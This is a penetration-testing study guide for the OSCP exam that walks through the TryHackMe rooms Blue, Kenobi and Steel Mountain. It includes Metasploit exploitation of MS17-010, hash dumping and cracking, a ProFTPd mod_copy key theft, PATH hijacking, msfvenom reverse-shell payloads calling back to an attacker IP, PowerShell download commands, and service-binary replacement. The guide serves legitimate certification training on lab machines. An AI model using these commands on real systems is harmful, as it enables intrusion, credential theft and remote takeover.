# OSCP Preparation Guide 2020
*Work in progress by [superhero1](https://twitter.com/_superhero1), watch the stream on [Twitch](https://twitch.tv/sup3rhero1)*


## Pre-Prep
### Public resources
[Offensive-Security Syllabus](https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf)
[Official Exam Guide](https://support.offensive-security.com/oscp-exam-guide/)
[How to prepare for PWK/OSCP, a noob-friendly guide](https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob)
[https://xapax.gitbooks.io/security/content/](https://xapax.gitbooks.io/security/content/)
[OSCP Goldmine](http://0xc0ffee.io/blog/OSCP-Goldmine)

### Other resources
[TryHackMe](https://bit.ly/tryhackme)

### Costs
The cost is currently $999USD for the baseline + cert which includes 30 days Lab access.
This might not be enough if you are not already experienced in a lot of the techniques.

### Restrictions
#### Exam restrictions
Pay attention to the following exam restrictions as of April 23, 2020:

You cannot use any of the following on the exam:

- Spoofing (IP, ARP, DNS, NBNS, etc)
- Commercial tools or services (Metasploit Pro, Burp Pro, etc.)
- Automatic exploitation tools (e.g. db_autopwn, browser_autopwn, SQLmap, SQLninja etc.)
- Mass vulnerability scanners (e.g. Nessus, NeXpose, OpenVAS, Canvas, Core Impact, SAINT, etc.)
- Features in other tools that utilize either forbidden or restricted exam limitations

Any tools that perform similar functions as those above are also prohibited. You are ultimately responsible for knowing what features or external utilities any chosen tool is using. The primary objective of the OSCP exam is to evaluate your skills in identifying and exploiting vulnerabilities, not in automating the process.

You may however, use tools such as Nmap (and its scripting engine), Nikto, Burp Free, DirBuster etc. against any of your target systems.

Please note that we will not comment on allowed or restricted tools, other than what is included inside this exam guide.

#### Metasploit Restrictions
The usage of Metasploit and the Meterpreter payload are restricted during the exam. You may only use Metasploit modules ( Auxiliary, Exploit, and Post ) or the Meterpreter payload against one single target machine of your choice. Once you have selected your one target machine, you cannot use Metasploit modules ( Auxiliary, Exploit, or Post ) or the Meterpreter payload against any other machines.

Metasploit/Meterpreter should not be used to test vulnerabilities on multiple machines before selecting your one target machine ( this includes the use of check ) . You may use Metasploit/Meterpreter as many times as you would like against your one target machine.

If you decide to use Metasploit or Meterpreter on a specific target and the attack fails, then you may not attempt to use it on a second target. In other words, the use of Metasploit and Meterpreter becomes locked in as soon as you decide to use either one of them.

You may use the following against all of the target machines:

- multi handler (aka exploit/multi/handler)
- msfvenom
- pattern_create.rb
- pattern_offset.rb

All the above limitations also apply to different interfaces that make use of Metasploit (such as Armitage, Cobalt Strike, Metasploit Community Edition, etc).

### Day 0

#### How to start?
First you should get an idea what you need for OSCP and how big the gaps are. So while doing this on my stream, we started with the OSCP path on TryHackMe.

#### Blue room
"this machine does not respond to ping (ICMP)"

We added the IP of the target to `/etc/hosts` as `target`.

`nmap -T4 -A -Pn -sS target`

```
Host is up, received arp-response (0.0079s latency).
Scanned at 2020-04-23 17:16:12 UTC for 159s
Not shown: 991 closed ports
Reason: 991 resets
PORT      STATE SERVICE        REASON          VERSION
135/tcp   open  msrpc          syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn    syn-ack ttl 128 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   syn-ack ttl 128 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server? syn-ack ttl 128
|_ssl-date: 2020-04-23T17:17:52+00:00; 0s from scanner time.
49152/tcp open  msrpc          syn-ack ttl 128 Microsoft Windows RPC
49153/tcp open  msrpc          syn-ack ttl 128 Microsoft Windows RPC
49154/tcp open  msrpc          syn-ack ttl 128 Microsoft Windows RPC
49158/tcp open  msrpc          syn-ack ttl 128 Microsoft Windows RPC
49160/tcp open  msrpc          syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 02:FD:5D:B4:0C:A0 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=4/23%OT=135%CT=1%CU=43186%PV=Y%DS=1%DC=D%G=Y%M=02FD5D%
OS:TM=5EA1CDFB%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=I%II=
OS:I%SS=S%TS=7)OPS(O1=M2301NW8ST11%O2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M230
OS:1NW8ST11%O5=M2301NW8ST11%O6=M2301ST11)WIN(W1=2000%W2=2000%W3=2000%W4=200
OS:0%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M2301NW8NNS%CC=N%Q=)T1(R=Y%
OS:DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=
OS:0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S
OS:=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R
OS:=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%
OS:RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Uptime guess: 0.010 days (since Thu Apr 23 17:04:20 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h14m59s, deviation: 2h30m00s, median: 0s
| nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:fd:5d:b4:0c:a0 (unknown)
| Names:
|   JON-PC<00>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   JON-PC<20>           Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-04-23T12:17:46-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-23T17:17:46
|_  start_date: 2020-04-23T17:05:11

TRACEROUTE
HOP RTT     ADDRESS
1   7.93 ms target (10.10.116.249)
Final times for host: srtt: 7931 rttvar: 6268  to: 100000
```
Scan for Eternal Blue vulnerability:
`nmap -sC -sV --script vuln -p137,139,445 target`

```
Host is up (0.0013s latency).

PORT    STATE  SERVICE      VERSION
137/tcp closed netbios-ns
139/tcp open   netbios-ssn  Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp open   microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
MAC Address: 02:FD:5D:B4:0C:A0 (Unknown)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```

We are going to query searchsploit to understand what this vuln is about:
`searchspoilt --update && searchsploit CVE-2017-0143`

We start Metasploit with `msfconsole` command.

```
search ms17-010
use 3
setg RHOST target
run
dir
[Ctrl+z][y]

search shell_to_meterpreter
use 0
show options
sessions
set SESSION 1
run
whoami
sessions -i 2
getsystem
getuid
shell
whoami
[Ctrl+z][y]
ps
migrate 3048
hashdump
```
Result:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

[Hashcat Cheat Sheet](https://www.dropbox.com/s/kdklrowv683yq1a/HashcatCheatSheet.v2018.1b%20%282%29.pdf?dl=0)

`hashcat --force -m 1000 crackme.txt /usr/share/wordlists/rockyou.txt -o output.txt`

Password for `Jon` is `alqfna22`. Use this command to connect via Remote Desktop: `xfreerdp target`. As Domain you can enter `local`.

### Day 1 - Going further

#### Kenobi

We start with a basic and fast nmap scan: `nmap -T4 target`

Result:
```
Host is up (0.037s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
```

We can use nmap to scan for the most common vulnerabilities too: `nmap --script vuln target`

Result:
```

```

This takes way too long! We can scan more specific: `nmap -p 445 --script vuln target`

Result:
```
Host is up (0.036s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
```

Let's evaluate the SMB:
```
smbclient //target/anonymous
smbget -R smb://target/anonymous
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount target
```

As searchsploit is a great tool to show more information about vulns along content in exploit-db we install it manually if not using Kali:
```
cd /opt
git clone https://github.com/offensive-security/exploitdb.git
export PATH=/opt/exploitdb:$PATH
git clone https://github.com/offensive-security/exploitdb-papers.git
searchsploit proftpd 1.3.5
```

Result (excerpt):
```
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                     | exploits/linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                           | exploits/linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                     | exploits/linux/remote/36742.txt
```
Obviously, this version is vulnerable to [SITE CPFR and SITE CPTO commands](http://www.proftpd.org/docs/contrib/mod_copy.html).

```
nc target 21
--> 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.121.24]
SITE CPFR /home/kenobi/.ssh/id_rsa
--> 350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
--> 250 Copy successful
```

Now we mount the network share:
```
apt install cifs-utils nfs-common #in case this is not installed
mkdir /mnt/kenobiNFS
sudo mount target:/var /mnt/kenobiNFS/
ls -la /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
ssh-keygen -f "/home/ubuntu/.ssh/known_hosts" -R "target" #in case we get a DNS SPOOFING alert
ssh kenobi@target -i id_rsa
```

You can now login through `ssh kenobi@target -i id_rsa`.

First, get the user flag: `cat user.txt`. Afterwards, let's find some sticky bits: `find / -perm -u=s -type f 2>/dev/null`.

One file is standing out: `/usr/bin/menu`, run it.

It gives three option. Let's examine the executable with `strings /usr/bin/menu`.

You will see the corresponding commands:
```
curl -I localhost
uname -r
ifconfig
```

Let's try to copy /bin/bash to the local folder and add it to our PATH environment variable so we can overwrite the regular curl command as it is not referenced by an absolute path:
```
echo /bin/bash > curl
chmod 777 curl
export PATH=/home/kenobi:$PATH
```

After that we run `/usr/bin/menu` again and choose option `1`:
```
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:~# 
```

The command the script runs is: `curl -I localhost`. So if we would just `cp /bin/bash ./curl` it would still pass the argument and fail.

Finally, we can get the root flag: `cat /root/root.txt`.

### Day 2 - Practice

#### Steel Mountain

We start with nmap as usual:
```
Host is up (0.038s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2020-04-25T14:03:27+00:00; -1s from scanner time.
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49161/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:81:1a:c8:73:28 (unknown)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-25T14:03:22
|_  start_date: 2020-04-25T14:01:24
```

#### Using metasploit framework

You can get PowerUp.ps1 from [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1).

```
msfconsole
search rejetto
use 0
set RHOSTS target
set RPORT 8080
run

upload PowerUp.ps1
load powershell
powershell_shell
. ./PowerUp.ps1
Invoke-AllChecks
```
Result (excerpt):
```
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
```

We want to abuse this service and write permissions along CanRestart sp we generate a payload with:
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.2.58 LPORT=4443 -e x86/shikata_ga_nai -f exe -o ASCService.exe`

Stop the service, replace the binary and start the service:

```
sc stop AdvancedSystemCareService9
copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
sc start AdvancedSystemCareService9
```

List the processes and migrate to "TrustedInstaller":
```
ps
migrate 904
getsystem
whoami
cd C:\Users\Administrator\Desktop
more root.txt
```

#### Manual part

Save the [exploit](https://www.exploit-db.com/raw/39161) to `exploit.py`, save [nc.exe](https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/ncat.exe) to `nc.exe`. Download WinPEAS from [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases).

We will serve the files through a HTTP python server by using this command: `python3 -m http.server 80`

Besides, we need to listen on the port set in the script: `nc -lnvp 4443`.

Run the script two times:
```
python exploit.py target 8080
python exploit.py target 8080
```

You will get a shell! In the shell run:

```
powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.11.2.58/winpeas.exe','C:\Users\bill\Desktop\winpeas.exe')
```

to upload winpeas.exe to the target's Desktop of the current user.

Run `winpeas.exe`.

In the output you will see it points us towards unquoted paths of *AdvancedSystemCareService9*.

We will again abuse this service and generate a payload using: 
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.2.58 LPORT=4442 -f exe -o ASCService.exe`

Upload the payload using this command:
`powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.11.2.58/ASCService.exe','C:\Users\bill\Desktop\ASCService.exe')`

Start a listener on port 4442: `nc -lnvp 4442`.

Finally, run the following commands again to stop, replace and start the service.
```
sc stop AdvancedSystemCareService9
copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
sc start AdvancedSystemCareService9
```

Your shell will pop on your listener.